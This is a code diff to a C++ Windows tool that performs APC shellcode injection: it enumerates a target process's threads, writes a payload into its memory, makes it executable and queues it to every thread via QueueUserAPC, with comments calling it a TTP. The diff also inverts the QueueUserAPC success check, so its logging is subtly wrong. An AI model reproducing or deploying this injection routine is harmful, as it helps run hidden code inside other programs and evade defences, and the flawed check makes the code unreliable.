@@ -49,7 +49,7 @@ BOOL FindTargetProcess(wchar_t* tgtProcessName, DWORD& pid, std::vector<DWORD>& 
 }
 */
 
-
+// tgtProcessId is provided by the user. pid and tids value is updated by the code (updated by pointer reference)
 BOOL FindTargetProcessById(int tgtProcessId, DWORD& pid, std::vector<DWORD>& tids) {
     BOOL found = FALSE;
     HANDLE hSnapShot = INVALID_HANDLE_VALUE;
@@ -80,7 +80,8 @@ BOOL FindTargetProcessById(int tgtProcessId, DWORD& pid, std::vector<DWORD>& tid
                     do {
                         // if the thread belongs to the process
                         if (te32.th32OwnerProcessID == pe32.th32ProcessID) {
-                            tids.push_back(te32.th32OwnerProcessID);
+                            // push the thread id into the tids vector
+                            tids.push_back(te32.th32ThreadID);
                         }
                     } while (Thread32Next(hSnapShot, &te32));
                 }
@@ -148,7 +149,6 @@ int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
     printf("[+] Successfully opened handle to the target process\n");
 
     // allocate memory in the target process
-    PVOID baseAddress = { 0 };
     PVOID remoteBase = 0;
     SIZE_T allocSize = payload_size;
 
@@ -162,7 +162,7 @@ int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
 
 
     // write to the memory of the target process
-    if(!WriteProcessMemory(hTargetProcess, remoteBase /*&baseAddress*/, payload, payload_size, NULL)) {
+    if(!WriteProcessMemory(hTargetProcess, remoteBase, payload, payload_size, NULL)) {
         printf("[-] Failed to write to the memory of the target process 0x%1x\n", GetLastError());
         exit(-1);
     }
@@ -170,7 +170,7 @@ int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
 
     unsigned long old_protection = 0;
     // change memory protection RW -> RX
-    if(!VirtualProtectEx(hTargetProcess, remoteBase /*&baseAddress*/, payload_size, PAGE_EXECUTE_READ, &old_protection)) {
+    if(!VirtualProtectEx(hTargetProcess, remoteBase, payload_size, PAGE_EXECUTE_READ, &old_protection)) {
         printf("[-] Failed to change the memory protection from RW -> RX 0x%1x\n", GetLastError());
         exit(-1);
     }
@@ -180,19 +180,31 @@ int APCInjection(unsigned char payload[], SIZE_T payload_size, int pid) {
         Make a thread. the base addresss of this thread should point to the shellcode. 
         When the thread goes to alerable state, the shellcode should get executed.
     */
-    PTHREAD_START_ROUTINE tRoutine = (PTHREAD_START_ROUTINE)remoteBase; //baseAddress;
+    PTHREAD_START_ROUTINE tRoutine = (PTHREAD_START_ROUTINE)remoteBase;
 
     // loop through all the threads in the target process id
     for (DWORD tid: tids) {
         // open those threads
         hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);
         // queue to the APC of the thread
+        // since we are queueing out shellcode to all the threads, there might be a possibility that all these threads might to go alterable state.
+        // if all or multiple of our threads are in alterable state, then, our shellocde to executed multiple times.
+        // also what if all these threads are dead (less chance that not even one is active), then our shellcode might not get executed at all!
+        // this is what makes this TTP a bit unstable.
+
         DWORD queueAPCStatus;
         queueAPCStatus = QueueUserAPC((PAPCFUNC)tRoutine, hThread, 0);
         if (queueAPCStatus != 0) {
-            printf("[-] Failed to queue to the API 0x%1x\n", GetLastError());
+            printf("[-] Failed to queue APC to the tid %d with error code: 0x%1x\n", tid, GetLastError());
+        } else {
+            printf("[+] Successfully queued to the APC with tid %d\n", tid);
         }
-        printf("[+] Successfully queued to the APC\n");
+
+        // Whenver we execute a routine such as `SleepEx`, it makes the thread transition from ring 3 to ring 0 and put it in alertable state.
+        // Now when we queue any APC into such a thread, even if it is sleeping, the thread will awake and first exec the APC code before executing any of its own code.
+        // basically, the thread returns from ring 0 to ring 3 and immediately checks if there is any pending APC's to execute.
+        
+        Sleep(2000);
     }
 
     return 0;
